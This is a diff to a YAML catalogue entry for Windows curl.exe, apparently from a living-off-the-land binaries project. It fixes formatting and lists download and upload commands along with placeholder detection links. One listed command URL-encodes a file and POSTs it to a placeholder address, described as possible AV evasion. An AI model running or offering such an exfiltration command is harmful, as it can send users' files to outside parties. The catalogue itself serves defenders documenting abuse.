@@ -1,31 +1,33 @@
 ---
 Name: Curl.exe
-Description: While the curl command in Powershell is just an alias for Invoke-WebRequest, curl.exe has much of the functionality of its Linux Counterpart. This may be able to be expanded.
-Aliases:  # Optional field if any common aliases exist of the binary with nearly the same functionality,
-  - Alias: 
+Description: While the curl command in Powershell is just an alias for
+  Invoke-WebRequest, curl.exe has much of the functionality of its Linux
+  Counterpart. This may be able to be expanded.
+Aliases:
+  - Alias: null
 Author: John Fawcett (5HR3K)
-Created:2026-05-19
+Created: 2026-05-19
 Commands:
   - Command: curl.exe -o newfile.txt https://www.example.com/file.txt
-    Description: Download a file 
-    Usecase: Another method of downloading 
+    Description: Download a file
+    Usecase: Another method of downloading
     Category: Download
     Privileges: User
     MitreID: Ingress Tool Transfer
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags:Download
-      - Key1: Value1  # Optional field for one or more tags
+    Tags:
+      - Key1: Download
   - Command: curl.exe --data-urlencode "<file>" https://<sent address>
     Description: Encode file and send via a POST request
-    Usecase: Possible AV Evasion 
+    Usecase: Possible AV Evasion
     Category: Encoding
     Privileges: User
-    MitreID: T1027.013: Encrypted/Encoded File
+    MitreID:T1027.013: Encrypted/Encoded File
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: c:\windows\system32\curl.exe
 Code_Sample:
-  - Code: 
+  - Code: null
 Detection:
   - IOC: Event ID 10
   - IOC: binary.exe spawned
@@ -34,7 +36,6 @@ Detection:
   - Elastic: https://example.com/to/elastic/rule/if/applicable
   - Splunk: https://example.com/to/splunk/rule/if/applicable
   - BlockRule: https://example.com/to/microsoft/block/rules/if/applicable
-Resources:
- 
-Acknowledgement:
+Resources: null
+Acknowledgement: null
  
